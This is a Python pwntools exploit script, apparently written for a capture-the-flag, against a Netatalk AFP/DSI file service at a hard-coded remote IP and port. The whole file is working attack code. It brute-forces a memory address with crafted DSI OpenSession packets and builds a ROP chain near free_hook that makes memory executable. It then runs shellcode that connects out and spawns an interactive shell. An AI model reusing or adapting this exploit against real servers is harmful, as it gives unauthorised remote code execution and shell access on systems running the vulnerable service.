from pwn import *
import struct

ip = localhost
port = 4444
context.log_level = "error"
#ip = 'localhost'
ip = '3.114.63.117'
port = 48763
def create_header(addr):
    dsi_opensession = "\x01" # attention quantum option
    dsi_opensession += chr(len(addr)+0x10) # length
    dsi_opensession += "a"*0x10+addr
    dsi_header = "\x00" # "request" flag
    dsi_header += "\x04" # open session command
    dsi_header += "\x00\x01" # request id
    dsi_header += "\x00\x00\x00\x00" # data offset
    dsi_header += struct.pack(">I", len(dsi_opensession))
    dsi_header += "\x00\x00\x00\x00" # reserved
    dsi_header += dsi_opensession
    return dsi_header

def create_afp(idx,payload):
    afp_command = chr(idx) # invoke the second entry in the table 
    afp_command += payload
    dsi_header = "\x00" # "request" flag
    dsi_header += "\x02" # "AFP" command
    dsi_header += "\x00\x02" # request id
    dsi_header += "\x00\x00\x00\x00" # data offset
    dsi_header += struct.pack(">I", len(afp_command))
    dsi_header += '\x00\x00\x00\x00' # reserved
    dsi_header += afp_command
    return dsi_header

#addr = p64(0x7f5274565000)[:6]
addr = p64(0x7f812631d000)[:6]
#addr=  ""
while len(addr)<6 :
    for i in range(256):
        r = remote(ip,port)
        r.send(create_header(addr+chr(i)))
        try:
            if "a"*4 in r.recvrepeat(1):
                addr += chr(i)
                r.close()
                break
        except:
            r.close()
    val = u64(addr.ljust(8,'\x00'))
    print hex(val)
addr += "\x00"*2
offset = 0x5246000 #00x5357000  #0x5246000
r = remote(ip,port)

libc = u64(addr)+offset
libtalk = libc+0xa1c000
print hex(libc)
r.send(create_header(p64(libtalk+0x27E0B0-0x30))) # Near the free_hook
context.arch = "amd64"
data = range(0x119)
data[0x10e] = libtalk+0x28300
data[0x78] = libc+0x402950
data[0x10d] =libtalk+0x27FF0
data[0x95] = libtalk+0x46790
data[0x12]=  libc+0x4050e0
data[0x81] = libc+0x134bf0
data[0x105] = libc+0x116fe0
data[0xe1] = libc+0xbb460
i = 0
data[0] = u64("/bin/sh\x00")
data[1] = libc+0x2155f
data[2] = (libtalk+0x27E0B0)&(~0xfff)
data[3] = libc+0x23e6a
data[4] = 0x1000
data[5] = libc+0x1b96
data[6] = 0x7
data[7] = libc+0x439c8
data[8] = 0xa
data[9] = libc+0x0d2975
data[10] = libtalk+0x27e110
data[11] = 0x3eeb


shellcode = asm("""
add rsp,0x1000
""") + asm(shellcraft.connect(ip,port))+ asm(shellcraft.dupsh())

shellcode += "\x90"*(8-len(shellcode)%8)
for i in range(0,len(shellcode),8):
    data[0x13+i/8] = u64(shellcode[i:i+8])

payload = "\x00"*0x30+p64(libc+0x4027d0)+flat(data)+p64(libc+0x54803)

print "break " + hex(libtalk+0x4522A)

dsi_header = "\x00" # "request" flag
dsi_header += "\x08" # "AFP" command
dsi_header += "\x00\x02" # request id
dsi_header += "\x00\x00\x00\x00" # data offset
dsi_header += struct.pack(">I", len(payload))
dsi_header += '\x00\x00\x00\x00' # reserved)

r.send(dsi_header)
r.send(payload)
r.send(dsi_header)
r.send("\x00"*0x30+p64(libtalk+0x4522A))

r.interactive()

